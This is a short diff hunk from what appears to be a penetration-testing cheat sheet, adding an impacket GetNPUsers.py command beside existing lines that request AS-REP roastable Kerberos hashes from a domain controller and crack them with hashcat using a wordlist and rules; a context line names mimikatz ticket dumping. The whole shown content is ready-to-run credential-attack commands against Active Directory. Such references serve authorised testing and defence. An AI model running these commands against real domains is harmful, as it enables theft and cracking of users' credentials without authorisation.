@@ -5996,6 +5996,7 @@ mimikatz # sekurlsa::tickets
 
 ```c
 impacket-GetNPUsers -dc-ip <RHOST> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>
+GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile hashes -dc-ip IP
 hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
